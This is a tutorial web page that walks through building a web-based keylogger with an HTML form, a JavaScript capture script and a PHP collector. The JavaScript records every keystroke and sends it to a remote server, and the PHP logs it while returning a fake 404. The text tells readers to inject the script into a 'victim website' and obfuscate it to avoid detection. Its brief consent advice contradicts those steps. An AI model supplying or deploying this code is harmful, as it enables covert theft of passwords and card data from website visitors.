## Introduction

Researchers estimate thousands of e-commerce sites are under attack by a single threat actor that has infected servers with a web-based keylogger. Popular e-commerce sites infected with web-based keyloggers are being used to steal credit card data as it's entered into online checkout forms. More than 100 compromised sites have been identified, but the number could be in the thousands.

In today’s digital landscape, understanding security vulnerabilities is crucial. Whether you’re a developer, a security enthusiast, or just curious about how keyloggers work, this tutorial will guide you through the process of building a simple web-based keylogger. By combining JavaScript and PHP, you’ll be able to record and analyze user keystrokes on your website. Remember that responsible use and ethical considerations are essential when implementing such features.

* * *

## Setting Up Your Environment

**Prerequisites**

Before diving into the code, ensure you have the following prerequisites:

- Set up a local development environment with PHP and a web server (such as Apache or Nginx).
- Create a new directory for your project.

**User Consent**

- Inform users that their keystrokes are being recorded (e.g., through a disclaimer or terms of use).
- Obtain explicit consent if necessary.

**Data Transmission**

- Implement encryption (e.g., HTTPS) for transmitting data between the client and server.
- Avoid storing sensitive information like passwords.

**Server Security**

- Regularly review and secure your server to prevent unauthorized access.

* * *

## What We Can Do With a Keylogger?

Keylogger is a type of software that once active on a system, can record every keystroke made by the system. All the recorded keystroke is saved in a log file. A keylogger can record a message, email, and capture any type of information you type at any time using your keyboard.

### Who Uses a Keylogger?

A keylogger is a surveillance tool, used by employers to ensure employees use work computers for business purposes only. There's also a growing market for parents who want to use these tools to stay informed about a child's online activities. But nowadays these tools are used by a hacker for hacking email ids and confidential information of the user like password Social Security number, Credit Card, etc ... This is one of the easiest ways of extracting critical information by tricking people.

### How It Works?

Below is an example for a simple web-based keylogger, In this documentation, you will know how keylogger works, type of programming by which we record and monitor every keystroke typed by the user on a website.

* * *

## Create The Keylogger

First of all, we have to create an environment for practical and follow the steps which we mention in the details below.

### Create HTML Form

```html
<form action="#">
    <label>Firstname:</label>
    <input type="text" name="firstname" placeholder="Mickey" style="width:250px">
    <label>Lastname:</label>
    <input type="text" name="lastname" placeholder="Mouse" style="width:250px">
    <label>Message:</label>
    <textarea name="message" style="width:500px;height:100px;"></textarea>
    <input type="submit" value="Submit">
</form>
```

This HTML form is for the unique purpose to demonstrate how a web-based keylogger works.

### Create JS Keylogger file - keylogger.js

```html
if((window.jQuery))
{ 
    console.log("jQuery Found");
}
else
{ 
    console.log("jQuery Not Found");
    var script = document.createElement('script');
    script.src = 'https://code.jquery.com/jquery-3.3.1.min.js';
    document.body.appendChild(script);
}

function c(d)
{
    jQuery.ajax(
    { 
        dataType: "jsonp",
        type: "GET",
        url: "https://example.com/keylogger.php",
        jsonp: "keypressed",
        data: 
        { 
            altnKey: d.altKey ? 1:0,
            ctrlKey: d.ctrlKey ? 1:0,
            userKey: d.key,
            targKey: d.target.id,
            userURI: d.target.baseURI
        },
        async: false,
        success: function(data)
        { 
            console.log(data);
        },
        error: function(xhr, ajaxOptions, thrownError)
        { 
            console.log("Error");
        }
    });
}

window.onload = function()
{ 
    window.addEventListener("keydown", function(e)
    { 
        c(e);
    });
}
```

The above code in JavaScript can be injected directly to the victim website or can be hosted remotely. The purpose of this code is to grab the keystroke of the user and send it to a remote server. Please be sure to replace "[https://example.com/keylogger.php](https://web.archive.org/web/20210226153558/https://example.com/keylogger.php)" with the real URL of your PHP file.

To save time we are going to do it with jQuery. So to avoid any errors the first thing we do is make sure that jQuery is present on the victim page, and load it in case we didn't found it.

We declare a function "**c**", where the parameter "**d**" which will be the keypress. This function will have an Ajax call to the PHP file that receives the keystrokes.

### Create PHP Keylogger file - keylogger.php

```html
header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');
$file = 'data.txt';
if(!file_exists($file))
{ 
    $fh = fopen($file, 'w');
}

function f($str)
{ 
    return trim(preg_replace("(\\\)","",htmlentities(strip_tags($str),ENT_QUOTES,'UTF-8')));
}

$altnKey = (int)$_GET['altnKey'];
$ctrlKey = (int)$_GET['ctrlKey'];
$userKey = f($_GET['userKey']);
$targKey = f($_GET['targKey']);
$userURI = f($_GET['URI']);
$string = $altnKey."|".$ctrlKey."|".$userKey."|".$targKey."|".$userURI." ";
file_put_contents($file, $string, FILE_APPEND);
```

The server part is in PHP. There is nothing to explain about the above code, the purpose of the PHP file is to receive the keystroke value transferred in Ajax by the JavaScript and store it in a simple text file. The "keylogger.php" must be hosted to a remote server and the full file URL must be specified in the "keylogger.js" file.

You can adapt the above code to match your exact needs. For example, you maybe would like to save the results directly to a database or either send it to an e-mail address.

### Inject the JS file

Now that we are ready with our file, we must inject the JavaScript on our victim website. To do it, we will add the below line of code at the end of our HTML file. In a real situation, you must add this line between the tags. Please be sure to replace "[https://example.com/keylogger.js](https://example.com/keylogger.js)" with the real URL of your JS file.

```html
<script type="text/javascript" src="https://example.com/keylogger.js"></script>
```

### Javascript Obfuscation

We can move further, using an [obfuscation](https://javascriptobfuscator.com/) online tool to hide our JavaScript code and avoid the website owner to detect the keylogger at first sight.

* * *

## Conclusion

Creating a web-based keylogger involves setting up HTML, JavaScript, and PHP components. While this tutorial provides a basic overview, you can explore more advanced features like capturing mouse events, tracking specific fields, or analyzing patterns in keystrokes. Always prioritize user privacy and security, and use keyloggers responsibly.